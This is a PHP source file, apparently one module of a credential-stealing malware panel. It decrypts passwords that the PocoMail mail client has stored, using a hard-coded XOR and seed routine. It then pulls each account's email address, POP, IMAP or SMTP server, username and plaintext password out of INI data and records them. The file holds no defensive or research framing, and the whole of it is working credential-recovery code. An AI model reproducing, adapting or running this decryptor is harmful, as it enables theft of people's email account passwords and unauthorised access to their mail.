<?php
class Module_pocomail extends Module_
{
    private function Decrypt($Password, $Type = 0)
	{
		$Password = trim($Password);
		if (!strlen($Password))
			return '';

		$DecPW = hex2bin($Password);
        $Seed  = 0x2A9A;
		
		if($Type == 1)
			$Seed = 0x2537;
		
		$Result = '';
		
		for ($i = 0; $i < strlen($DecPW); $i++)
		{
            $Result .= chr(ord($DecPW[$i]) ^ (($Seed >> 8) & 0xff));
            $Seed += ord($DecPW[$i]);
            $Seed = hexdec(gmp_strval(gmp_and(gmp_add(gmp_mul("$Seed", "0x8141"), "0x3171"), "0xffff"), 16));
		}
		
		return $Result;
	}

	protected function process_poco($Data)
	{
		if (strlen($Data) < 5)
			return;

		$Sections = parse_ini($Data);
		foreach ($Sections as $Section)
		{
			if (!is_array($Section))
				continue;

			$Email		= Assign_($Section['Email']);
			
			$POPServer 	= Assign_($Section['POPServer']);
			$POPUser 	= Assign_($Section['POPUser']);
			$POPPass 	= $this->Decrypt(Assign_($Section['POPPass']));
			
			$SMTPServer = Assign_($Section['SMTP']);
			$SMTPUser 	= Assign_($Section['SMTPUser']);
			$SMTPPass 	= $this->Decrypt(Assign_($Section['SMTPPass']));

			if (Assign_($Section['IMAP']) == '1')
				$Prot = 'imap';
			else
				$Prot = 'pop3';
			
			$this->add_email($Email, 'smtp', $SMTPServer, '', $SMTPUser, $SMTPPass);
			$this->add_email($Email, $Prot, $POPServer, '', $POPUser, $POPPass);
			
		}
		
		$Sections = NULL;
	}
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->process_poco($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

